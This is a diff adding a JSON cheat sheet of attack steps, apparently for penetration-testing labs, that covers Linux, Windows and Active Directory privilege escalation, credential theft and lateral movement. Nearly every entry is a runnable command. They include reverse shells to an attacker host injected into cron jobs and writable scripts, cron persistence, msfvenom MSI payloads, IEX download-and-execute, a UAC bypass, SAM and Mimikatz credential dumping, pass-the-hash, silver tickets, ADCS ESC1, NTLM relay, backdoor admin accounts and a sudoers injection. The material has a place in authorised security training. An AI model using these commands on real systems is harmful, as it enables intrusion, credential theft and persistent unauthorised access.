@@ -1,0 +1,617 @@
+[
+    {
+        "category": "Linux",
+        "technique": "Initial Enumeration",
+        "description": "First things to check after getting a shell",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Who am I / what groups",
+                "command": "id && whoami"
+            },
+            {
+                "step": 2,
+                "note": "Users with real shell (potential targets)",
+                "command": "getent passwd | grep -v nologin | grep -v false"
+            },
+            {
+                "step": 3,
+                "note": "Sudo rights — any NOPASSWD?",
+                "command": "sudo -l"
+            },
+            {
+                "step": 4,
+                "note": "OS version / kernel",
+                "command": "uname -a && cat /etc/os-release"
+            },
+            {
+                "step": 5,
+                "note": "Running processes (look for root processes)",
+                "command": "ps aux | grep root"
+            },
+            {
+                "step": 6,
+                "note": "Network connections / listening ports",
+                "command": "ss -tlnp"
+            }
+        ]
+    },
+    {
+        "category": "Linux",
+        "technique": "SUID Binary Abuse",
+        "description": "SUID binaries run as owner (often root) — check gtfobins.github.io",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Find all SUID binaries",
+                "command": "find / -perm -u=s -type f 2>/dev/null"
+            },
+            {
+                "step": 2,
+                "note": "Check gtfobins for the binary found, then exploit",
+                "command": "# e.g. find . -exec /bin/sh -p \\; -quit"
+            },
+            {
+                "step": 3,
+                "note": "PATH hijack — if binary calls another binary without full path",
+                "command": "cd /tmp && echo '/bin/sh' > <binary_name> && chmod 777 <binary_name> && export PATH=/tmp:$PATH"
+            },
+            {
+                "step": 4,
+                "note": "Run the vulnerable SUID binary",
+                "command": "/usr/bin/<binary>"
+            }
+        ]
+    },
+    {
+        "category": "Linux",
+        "technique": "Sudo NOPASSWD Abuse",
+        "description": "If sudo -l shows NOPASSWD — check gtfobins for that binary",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Check sudo permissions",
+                "command": "sudo -l"
+            },
+            {
+                "step": 2,
+                "note": "Ruby reverse shell (e.g. facter --custom-dir)",
+                "command": "echo 'exit if fork;c=TCPSocket.new(\"<lhost>\",<lport>);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end' > /tmp/shell.rb"
+            },
+            {
+                "step": 3,
+                "note": "Run with custom dir pointing to shell.rb",
+                "command": "sudo /usr/bin/facter --custom-dir=/tmp/ x"
+            },
+            {
+                "step": 4,
+                "note": "Simple shell via script (alternative)",
+                "command": "echo 'exec \"/bin/sh\"' > /tmp/shell.rb && sudo /usr/bin/facter --custom-dir=/tmp/ x"
+            }
+        ]
+    },
+    {
+        "category": "Linux",
+        "technique": "Capabilities Abuse",
+        "description": "Capabilities like cap_setuid+ep on interpreters = root without SUID",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Find binaries with capabilities set",
+                "command": "getcap -r / 2>/dev/null"
+            },
+            {
+                "step": 2,
+                "note": "Exploit cap_setuid on python3 (adjust binary path)",
+                "command": "/usr/bin/python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'"
+            },
+            {
+                "step": 3,
+                "note": "Exploit cap_setuid on perl",
+                "command": "perl -e 'use POSIX (setuid); POSIX::setuid(0); exec \"/bin/bash\";'"
+            }
+        ]
+    },
+    {
+        "category": "Linux",
+        "technique": "Cron Job Abuse",
+        "description": "Scripts run by root cron that are writable = instant privesc",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Check cron jobs",
+                "command": "cat /etc/crontab && ls -la /etc/cron*"
+            },
+            {
+                "step": 2,
+                "note": "Check user crontabs",
+                "command": "crontab -l"
+            },
+            {
+                "step": 3,
+                "note": "Find writable scripts being run as root",
+                "command": "find / -writable -type f 2>/dev/null | grep -v proc"
+            },
+            {
+                "step": 4,
+                "note": "Inject reverse shell into writable cron script",
+                "command": "echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /path/to/script.sh"
+            }
+        ]
+    },
+    {
+        "category": "Linux",
+        "technique": "Cron Wildcard (tar)",
+        "description": "tar with wildcard * in cron — inject checkpoint flags as filenames",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Confirm cron uses tar with wildcard",
+                "command": "cat /etc/crontab | grep tar"
+            },
+            {
+                "step": 2,
+                "note": "Create shell script to add sudoer",
+                "command": "echo '#!/bin/bash\\necho \"<user> ALL=(ALL:ALL) ALL\" >> /etc/sudoers' > /path/to/shell.sh && chmod +x /path/to/shell.sh"
+            },
+            {
+                "step": 3,
+                "note": "Create checkpoint flag files (tar reads these as flags)",
+                "command": "echo '' > '--checkpoint-action=exec=sh shell.sh' && echo '' > --checkpoint=1"
+            },
+            {
+                "step": 4,
+                "note": "Wait for cron to run, then sudo",
+                "command": "sudo -l && sudo -s"
+            }
+        ]
+    },
+    {
+        "category": "Linux",
+        "technique": "Writable File / Script",
+        "description": "Root-owned writable files — inject code or replace script",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Find root-owned writable files",
+                "command": "find / -writable -user root -type f 2>/dev/null | grep -v proc"
+            },
+            {
+                "step": 2,
+                "note": "Find files writable by current user",
+                "command": "find / -writable -type f 2>/dev/null | grep -v proc"
+            },
+            {
+                "step": 3,
+                "note": "Inject reverse shell into writable script",
+                "command": "echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /path/to/writable.sh"
+            }
+        ]
+    },
+    {
+        "category": "Linux",
+        "technique": "Persistence (Cron)",
+        "description": "Add cron reverse shell for persistent access after root",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Add cron reverse shell every minute",
+                "command": "( crontab -l 2>/dev/null; echo '* * * * * bash -i >& /dev/tcp/<lhost>/<lport> 0>&1') | crontab -"
+            },
+            {
+                "step": 2,
+                "note": "Start listener",
+                "command": "nc -lvnp <lport>"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "Initial Enumeration",
+        "description": "First things to check after getting a shell",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Who am I / privileges",
+                "command": "whoami && whoami /priv && whoami /groups"
+            },
+            {
+                "step": 2,
+                "note": "OS info",
+                "command": "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"System Type\""
+            },
+            {
+                "step": 3,
+                "note": "Check installed applications",
+                "command": "Get-ItemProperty \"HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*\" | select displayname"
+            },
+            {
+                "step": 4,
+                "note": "Search sensitive files in user dirs",
+                "command": "Get-ChildItem -Path C:\\Users\\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"
+            },
+            {
+                "step": 5,
+                "note": "Search config files (e.g. XAMPP)",
+                "command": "Get-ChildItem -Path C:\\xampp\\ -Include *.ini,*.conf,*.config -File -Recurse -ErrorAction SilentlyContinue"
+            },
+            {
+                "step": 6,
+                "note": "Command history",
+                "command": "Get-History"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "AlwaysInstallElevated",
+        "description": "If both registry keys = 1, any user can install MSI as SYSTEM",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Check HKLM key (must be 1)",
+                "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+            },
+            {
+                "step": 2,
+                "note": "Check HKCU key (must be 1)",
+                "command": "reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
+            },
+            {
+                "step": 3,
+                "note": "Generate malicious MSI payload (on attacker)",
+                "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f msi -o installer.msi"
+            },
+            {
+                "step": 4,
+                "note": "Install MSI (runs as SYSTEM)",
+                "command": "msiexec /quiet /qn /i installer.msi"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "Winlogon Saved Credentials",
+        "description": "Autologon stores plaintext credentials in registry",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Query Winlogon for saved creds",
+                "command": "reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\""
+            },
+            {
+                "step": 2,
+                "note": "Look for DefaultUsername and DefaultPassword fields",
+                "command": "# If found — use creds to escalate or move laterally"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "Dump SAM (Local Hashes)",
+        "description": "Dump local account hashes for cracking or PTH",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Save SAM and SYSTEM hives",
+                "command": "reg save hklm\\system SYSTEM && reg save hklm\\sam SAM"
+            },
+            {
+                "step": 2,
+                "note": "Exfil files to attacker, then dump offline",
+                "command": "impacket-secretsdump -sam SAM -system SYSTEM LOCAL"
+            },
+            {
+                "step": 3,
+                "note": "Or dump directly with Mimikatz",
+                "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"lsadump::sam\" \"exit\""
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "Mimikatz PTH / Token",
+        "description": "Use NTLM hash to spawn process as another user",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Enable debug privilege + elevate token",
+                "command": ".\\mimikatz.exe \"privilege::debug\" \"token::elevate\" \"exit\""
+            },
+            {
+                "step": 2,
+                "note": "Overpass-the-hash — spawn powershell as target user",
+                "command": "mimikatz.exe \"privilege::debug\" \"sekurlsa::pth\" /user:<user> /domain:<domain> /ntlm:<ntlm> /run:powershell"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "UAC Bypass (FodhelperBypass)",
+        "description": "Bypass UAC via Fodhelper — requires medium integrity shell",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Bypass execution policy",
+                "command": "powershell -ep bypass"
+            },
+            {
+                "step": 2,
+                "note": "Download and load FodhelperBypass",
+                "command": "(New-Object System.Net.WebClient).DownloadString('http://<lhost>/FodhelperBypass.ps1') | IEX"
+            },
+            {
+                "step": 3,
+                "note": "Bypass UAC — spawn reverse shell (base64 encoded)",
+                "command": "FodhelperBypass -program \"cmd.exe /c powershell -e <encoded_cmd>\""
+            },
+            {
+                "step": 4,
+                "note": "Or spawn cmd.exe (GUI / RDP only)",
+                "command": "FodhelperBypass -program \"cmd.exe /c powershell.exe\""
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "Potato Attacks (SeImpersonate)",
+        "description": "SeImpersonatePrivilege = can impersonate SYSTEM token via potato exploit",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Check if SeImpersonatePrivilege is enabled",
+                "command": "whoami /priv | findstr SeImpersonate"
+            },
+            {
+                "step": 2,
+                "note": "Add current user to local admins (SigmaPotato)",
+                "command": "SigmaPotato.exe \"net localgroup Administrators <user> /add\""
+            },
+            {
+                "step": 3,
+                "note": "Direct reverse shell via SigmaPotato",
+                "command": "SigmaPotato.exe --revshell <lhost> <lport>"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "Add Local Admin / Persistence",
+        "description": "Create backdoor account or escalate existing user",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Add new user",
+                "command": "net user <user> 'Password123@' /add"
+            },
+            {
+                "step": 2,
+                "note": "Add to local admins",
+                "command": "net localgroup administrators <user> /add"
+            },
+            {
+                "step": 3,
+                "note": "Read proof file",
+                "command": "type C:\\Users\\Administrator\\Desktop\\proof.txt"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "Unquoted Service Path",
+        "description": "Service binary path with spaces and no quotes — plant executable in path",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Find unquoted service paths",
+                "command": "wmic service get name,pathname | findstr /i /v \"C:\\Windows\\\\\" | findstr /i /v \"\\\"\""
+            },
+            {
+                "step": 2,
+                "note": "Check write permission on the vulnerable path",
+                "command": "icacls \"C:\\Program Files\\Vulnerable App\\\""
+            },
+            {
+                "step": 3,
+                "note": "Drop payload in the path (e.g. C:\\Program.exe)",
+                "command": "# Copy shell.exe to exploitable path segment"
+            },
+            {
+                "step": 4,
+                "note": "Restart service to trigger",
+                "command": "sc stop <service> && sc start <service>"
+            }
+        ]
+    },
+    {
+        "category": "Windows",
+        "technique": "MySQL (No Password)",
+        "description": "MySQL running as SYSTEM with empty root password",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Connect and list databases",
+                "command": "mysql.exe -uroot --password=\"\" -e \"SHOW DATABASES;\""
+            },
+            {
+                "step": 2,
+                "note": "Query a specific table",
+                "command": "mysql.exe -uroot --password=\"\" -e \"SELECT * FROM <database>.<table>;\""
+            }
+        ]
+    },
+    {
+        "category": "AD",
+        "technique": "Initial AD Enumeration",
+        "description": "PowerView basics — load first with: IEX (New-Object Net.WebClient).DownloadString('http://<lhost>/PowerView.ps1')",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Find machines where current user has local admin",
+                "command": "Find-LocalAdminAccess"
+            },
+            {
+                "step": 2,
+                "note": "List domain controllers",
+                "command": "Get-DomainController | select name"
+            },
+            {
+                "step": 3,
+                "note": "Domain Admins members",
+                "command": "Get-DomainGroup -Name \"Domain Admins\" | select member"
+            },
+            {
+                "step": 4,
+                "note": "Find users with description (may contain creds)",
+                "command": "Get-DomainUser | Where-Object {$_.description} | select samaccountname,description"
+            }
+        ]
+    },
+    {
+        "category": "AD",
+        "technique": "Kerberoasting",
+        "description": "Request TGS for SPN accounts → crack offline",
+        "steps": [
+            {
+                "step": 1,
+                "note": "List SPN accounts",
+                "command": "impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <dc_ip>"
+            },
+            {
+                "step": 2,
+                "note": "Request TGS hashes",
+                "command": "impacket-GetUserSPNs '<domain>/<user>:<password>' -dc-ip <dc_ip> -request -outputfile kerberoast.hash"
+            },
+            {
+                "step": 3,
+                "note": "Crack with hashcat",
+                "command": "hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt"
+            }
+        ]
+    },
+    {
+        "category": "AD",
+        "technique": "AS-REP Roasting",
+        "description": "Accounts with pre-auth disabled → get hash without creds",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Build user list first (RID brute or LDAP)",
+                "command": "nxc smb <ip> -u anonymous -p '' --rid-brute 5000 | grep SidTypeUser | awk '{print $6}' | cut -d'\\\\' -f2 > users.txt"
+            },
+            {
+                "step": 2,
+                "note": "AS-REP roast — get hashes for pre-auth disabled accounts",
+                "command": "impacket-GetNPUsers '<domain>/' -no-pass -usersfile users.txt -dc-ip <dc_ip> | grep -v KDC_ERR_C_PRINCIPAL_UNKNOWN"
+            },
+            {
+                "step": 3,
+                "note": "Crack with hashcat",
+                "command": "hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt"
+            }
+        ]
+    },
+    {
+        "category": "AD",
+        "technique": "Silver Ticket",
+        "description": "Forge TGS for specific service using service account NTLM hash — no DC needed",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Get domain SID",
+                "command": "impacket-lookupsid '<domain>/<user>:<password>'@<dc_ip> | grep 'Domain SID'"
+            },
+            {
+                "step": 2,
+                "note": "Get service account hash (e.g. via secretsdump)",
+                "command": "impacket-secretsdump '<domain>/<user>:<password>'@<ip>"
+            },
+            {
+                "step": 3,
+                "note": "Forge silver ticket and inject (ptt)",
+                "command": "kerberos::golden /sid:<sid> /domain:<domain> /ptt /target:<target_fqdn> /service:http /rc4:<ntlm> /user:<user>"
+            },
+            {
+                "step": 4,
+                "note": "Test access to service",
+                "command": "(iwr -UseDefaultCredentials http://<hostname>).Content"
+            }
+        ]
+    },
+    {
+        "category": "AD",
+        "technique": "ADCS ESC1",
+        "description": "Misconfigured certificate template — request cert as any user",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Find vulnerable templates",
+                "command": "certipy-ad find -u <user> -p '<password>' -dc-ip <dc_ip> -target <domain> -vulnerable -enabled"
+            },
+            {
+                "step": 2,
+                "note": "Request cert impersonating target user (ESC1)",
+                "command": "certipy-ad req -u '<user>@<domain>' -p '<password>' -ca '<ca_name>' -template '<template>' -upn 'Administrator@<domain>' -dc-ip <dc_ip> -target <dc_fqdn>"
+            },
+            {
+                "step": 3,
+                "note": "Auth with PFX to get NTLM hash",
+                "command": "certipy-ad auth -pfx administrator.pfx -dc-ip <dc_ip>"
+            },
+            {
+                "step": 4,
+                "note": "Use hash for PTH",
+                "command": "impacket-psexec -hashes ':<ntlm>' Administrator@<dc_ip>"
+            }
+        ]
+    },
+    {
+        "category": "AD",
+        "technique": "NTLM Relay",
+        "description": "Relay captured NTLM auth to another host — requires SMB signing disabled",
+        "steps": [
+            {
+                "step": 1,
+                "note": "Check SMB signing disabled on targets",
+                "command": "nxc smb <ip>/24 --gen-relay-list targets.txt"
+            },
+            {
+                "step": 2,
+                "note": "Start relay listener",
+                "command": "impacket-ntlmrelayx --no-http-server -smb2support -t <ip> -c 'powershell -enc <encoded_cmd>'"
+            },
+            {
+                "step": 3,
+                "note": "Trigger NTLM auth from victim (coerce)",
+                "command": "dir \\\\<lhost>\\test"
+            }
+        ]
+    },
+    {
+        "category": "AD",
+        "technique": "Lateral Movement (WinRM / PSExec)",
+        "description": "Move to another host after gaining creds or hash",
+        "steps": [
+            {
+                "step": 1,
+                "note": "WinRM shell with password",
+                "command": "evil-winrm -i <ip> -u '<user>' -p '<password>'"
+            },
+            {
+                "step": 2,
+                "note": "WinRM shell with hash (PTH)",
+                "command": "evil-winrm -i <ip> -u '<user>' -H '<ntlm>'"
+            },
+            {
+                "step": 3,
+                "note": "Remote cmd via winrs",
+                "command": "winrs -r:<hostname> -u:<user> -p:<password> cmd"
+            },
+            {
+                "step": 4,
+                "note": "PsExec with hash",
+                "command": "impacket-psexec -hashes ':<ntlm>' <user>@<ip>"
+            }
+        ]
+    }
+]
